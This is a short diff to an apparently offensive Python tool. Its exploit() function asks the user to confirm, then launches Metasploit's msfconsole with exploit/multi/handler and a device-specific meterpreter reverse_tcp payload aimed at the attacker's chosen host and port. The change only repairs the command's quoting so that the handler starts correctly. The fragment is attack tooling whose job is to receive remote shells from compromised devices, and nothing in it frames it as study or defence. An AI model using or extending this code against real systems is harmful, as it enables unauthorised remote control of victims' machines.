@@ -15,7 +15,7 @@ def exploit(device, lhost , lport):
     ASK = inquirer.confirm(message="Do You Want To Start Exploiting?", default=True).execute()
     if ASK:
         print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Starting..!{Col.reset}")
-        os.system(f'msfconsole -q -x " use exploit/multi/handler; set payload {device}/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit;')
+        os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload {device}/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit;"')
     else:
         print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}OK..!{Col.reset}")
 def run(_version_):
